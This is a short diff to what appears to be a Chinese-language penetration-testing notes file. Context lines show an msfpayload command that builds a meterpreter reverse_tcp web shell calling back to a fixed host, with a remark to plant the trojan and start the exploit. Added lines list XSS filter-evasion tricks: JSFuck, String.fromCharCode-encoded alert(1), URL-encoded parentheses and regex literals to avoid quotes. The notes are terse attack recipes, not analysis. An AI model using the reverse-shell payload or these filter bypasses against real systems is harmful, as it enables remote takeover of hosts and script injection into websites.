@@ -260,3 +260,13 @@ RHOST R 开头，远程主机
 msfpayload webshell/meterpreter/reverse_tcp LHOST=192.168.102.136 R > Desktop/web.shell
 
 安装木马 然后开启exploit即可
+
+
+#用jsfuck绕过xss验证的某些部分
+http://www.jsfuck.com/
+
+
+>1. 使用String.fromCharCode来避免关键字，如String.fromCharCode(97,108,101,114,116,40,49,41); 
+>2. 使用URL编码来避免括号的识别，如location=’alert%281%29’; 
+>
+3.使用正则对象的特点来避开引号，如alert(/1/);
